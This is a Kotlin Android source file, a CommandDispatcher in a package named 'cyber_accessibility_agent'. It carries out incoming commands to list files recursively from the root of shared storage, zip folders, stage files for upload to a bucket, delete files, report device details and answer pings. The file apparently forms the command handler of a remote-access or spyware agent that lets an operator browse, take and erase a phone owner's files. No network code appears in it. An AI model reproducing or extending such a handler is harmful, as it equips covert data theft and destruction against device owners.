package com.example.cyber_accessibility_agent

import android.content.ContentUris
import android.content.Context
import android.database.Cursor
import android.net.Uri
import android.os.Build
import android.provider.MediaStore
import android.util.Log
import java.io.*
import java.util.*
import java.util.zip.ZipEntry
import java.util.zip.ZipOutputStream
import kotlin.collections.ArrayList

object CommandDispatcher {
    private val TAG = "CommandDispatcher"

    /**
     * Dispatch a command. Caller MUST call from background thread.
     * Returns Map<String, Any?> which will be marshalled to Dart.
     *
     * Supported actions (canonical names from CommandParser):
     * - "list_files"   -> payload: { path, recursive?, limit? }
     * - "upload_file"  -> payload: { path, bucket?, dest? }
     * - "zip_files"    -> payload: { path, zip_name?, dest? }
     * - "delete_file"  -> payload: { path }
     * - "device_info"  -> payload: {}
     * - "ping"         -> payload: {}
     */
    fun dispatch(context: Context, id: String, action: String, payload: Map<*, *>): Map<String, Any?> {
        return try {
            when (action) {
                "list_files" -> listFiles(context, payload)
                "upload_file" -> prepareUpload(context, payload)
                "zip_files" -> zipPath(context, payload)
                "delete_file" -> deleteFile(context, payload)
                "device_info" -> deviceInfo(context, payload)
                "ping" -> ping(context, payload)
                else -> mapOf("success" to false, "error" to "unknown_action", "action" to action)
            }
        } catch (e: Exception) {
            Log.w(TAG, "dispatch error: ${e.message}", e)
            mapOf("success" to false, "error" to e.message)
        }
    }

    // -------------------------
    // Helpers / implementations
    // -------------------------

    private fun listFiles(context: Context, payload: Map<*, *>): Map<String, Any?> {
        val results = ArrayList<Map<String, Any?>>()
        val rawPath = (payload["path"] ?: payload["dir"] ?: "/storage/emulated/0/").toString()
        val limit = (payload["limit"] as? Number)?.toInt() ?: 200
        val recursive = payload["recursive"] == true || payload["recursive"] == "true"

        try {
            // If content URI supplied -> return single item metadata
            if (rawPath.startsWith("content://")) {
                val uri = Uri.parse(rawPath)
                val meta = querySingleContentUri(context, uri)
                if (meta != null) results.add(meta)
                return mapOf("success" to true, "count" to results.size, "files" to results)
            }

            val f = File(rawPath)
            if (!f.exists()) {
                return mapOf("success" to false, "error" to "path_not_found")
            }

            if (f.isFile) {
                results.add(fileMetaMap(f))
            } else {
                // directory walk (non-recursive unless requested)
                val stack = ArrayDeque<File>()
                stack.add(f)
                var collected = 0
                while (stack.isNotEmpty() && collected < limit) {
                    val cur = stack.removeFirst()
                    val children = cur.listFiles()
                    if (children == null) continue
                    // sort by lastModified descending (more recent first)
                    children.sortWith(Comparator { a, b -> b.lastModified().compareTo(a.lastModified()) })
                    for (c in children) {
                        if (collected >= limit) break
                        results.add(fileMetaMap(c))
                        collected++
                        if (recursive && c.isDirectory) {
                            stack.add(c)
                        }
                    }
                }
            }

            return mapOf("success" to true, "count" to results.size, "files" to results)
        } catch (e: Exception) {
            Log.w(TAG, "listFiles error: ${e.message}", e)
            return mapOf("success" to false, "error" to e.message)
        }
    }

    private fun querySingleContentUri(context: Context, uri: Uri): Map<String, Any?>? {
        return try {
            val proj = arrayOf(MediaStore.MediaColumns._ID, MediaStore.MediaColumns.DISPLAY_NAME, MediaStore.MediaColumns.SIZE, MediaStore.MediaColumns.DATE_MODIFIED)
            val c = context.contentResolver.query(uri, proj, null, null, null)
            c?.use {
                if (it.moveToFirst()) {
                    val idVal = try { it.getLong(it.getColumnIndexOrThrow(proj[0])) } catch (_: Exception) { 0L }
                    val name = try { it.getString(it.getColumnIndexOrThrow(proj[1])) ?: "" } catch (_: Exception) { "" }
                    val size = try { it.getLong(it.getColumnIndexOrThrow(proj[2])) } catch (_: Exception) { 0L }
                    val date = try { it.getLong(it.getColumnIndexOrThrow(proj[3])) } catch (_: Exception) { 0L }
                    mapOf(
                        "id" to idVal.toString(),
                        "display_name" to name,
                        "size" to size,
                        "date_modified" to date,
                        "uri" to uri.toString()
                    )
                } else null
            }
        } catch (e: Exception) {
            Log.w(TAG, "querySingleContentUri failed: ${e.message}")
            null
        }
    }

    private fun fileMetaMap(f: File): Map<String, Any?> {
        return mapOf(
            "path" to f.absolutePath,
            "name" to f.name,
            "is_dir" to f.isDirectory,
            "size" to if (f.isFile) f.length() else 0L,
            "last_modified" to f.lastModified()
        )
    }

    private fun deleteFile(context: Context, payload: Map<*, *>): Map<String, Any?> {
        val path = (payload["path"] ?: payload["filename"] ?: payload["target"] ?: "").toString()
        if (path.isEmpty()) return mapOf("success" to false, "error" to "missing path")

        return try {
            if (path.startsWith("content://")) {
                val uri = Uri.parse(path)
                val deleted = context.contentResolver.delete(uri, null, null)
                mapOf("success" to (deleted > 0), "deleted" to deleted)
            } else {
                val f = File(path)
                val ok = if (f.exists()) f.delete() else false
                mapOf("success" to ok, "deleted" to if (ok) 1 else 0)
            }
        } catch (e: Exception) {
            Log.w(TAG, "deleteFile error: ${e.message}", e)
            mapOf("success" to false, "error" to e.message)
        }
    }

    private fun zipPath(context: Context, payload: Map<*, *>): Map<String, Any?> {
        val rawPath = (payload["path"] ?: payload["file"] ?: "").toString()
        if (rawPath.isEmpty()) return mapOf("success" to false, "error" to "missing path")

        val dest = (payload["dest"] ?: "").toString()
        val zipName = (payload["zip_name"] ?: payload["zip"] ?: "").toString()

        return try {
            val src = File(rawPath)
            if (!src.exists()) return mapOf("success" to false, "error" to "path_not_found")
            val zipFile = if (dest.isNotEmpty()) File(dest) else {
                val defaultName = if (zipName.isNotEmpty()) zipName else "mediaagent_${System.currentTimeMillis()}.zip"
                File(context.cacheDir, defaultName)
            }

            ZipOutputStream(BufferedOutputStream(FileOutputStream(zipFile))).use { zos ->
                if (src.isDirectory) {
                    zipDirectory(src, src.name, zos)
                } else {
                    zipSingleFile(src, zos)
                }
            }

            mapOf("success" to true, "zip_path" to zipFile.absolutePath, "size" to zipFile.length())
        } catch (e: Exception) {
            Log.w(TAG, "zipPath error: ${e.message}", e)
            mapOf("success" to false, "error" to e.message)
        }
    }

    private fun zipDirectory(folder: File, baseName: String, zos: ZipOutputStream) {
        val files = folder.listFiles() ?: return
        for (f in files) {
            if (f.isDirectory) {
                zipDirectory(f, "$baseName/${f.name}", zos)
            } else {
                zipSingleFile(f, zos, "$baseName/${f.name}")
            }
        }
    }

    private fun zipSingleFile(file: File, zos: ZipOutputStream, entryName: String? = null) {
        val entry = ZipEntry(entryName ?: file.name)
        zos.putNextEntry(entry)
        FileInputStream(file).use { fis ->
            val buffer = ByteArray(8192)
            var read = fis.read(buffer)
            while (read > 0) {
                zos.write(buffer, 0, read)
                read = fis.read(buffer)
            }
        }
        zos.closeEntry()
    }

    private fun prepareUpload(context: Context, payload: Map<*, *>): Map<String, Any?> {
        val path = (payload["path"] ?: payload["file"] ?: payload["filename"] ?: "").toString()
        if (path.isEmpty()) return mapOf("success" to false, "error" to "missing path")

        // if content URI — just return URI info (Dart side should open via content resolver)
        if (path.startsWith("content://")) {
            return mapOf("success" to true, "file_path" to path, "name" to Uri.parse(path).lastPathSegment, "is_content_uri" to true)
        }

        val f = File(path)
        if (!f.exists()) return mapOf("success" to false, "error" to "file_not_found")

        return mapOf(
            "success" to true,
            "file_path" to f.absolutePath,
            "size" to f.length(),
            "name" to f.name
        )
    }

    private fun deviceInfo(context: Context, payload: Map<*, *>): Map<String, Any?> {
        return try {
            val pkg = context.packageName
            val free = try { context.filesDir.freeSpace } catch (_: Exception) { 0L }
            mapOf(
                "success" to true,
                "model" to Build.MODEL,
                "manufacturer" to Build.MANUFACTURER,
                "sdk_int" to Build.VERSION.SDK_INT,
                "package" to pkg,
                "cache_dir" to context.cacheDir.absolutePath,
                "files_free" to free
            )
        } catch (e: Exception) {
            mapOf("success" to false, "error" to e.message)
        }
    }

    private fun ping(context: Context, payload: Map<*, *>): Map<String, Any?> {
        return mapOf("success" to true, "ts" to System.currentTimeMillis(), "model" to Build.MODEL)
    }
}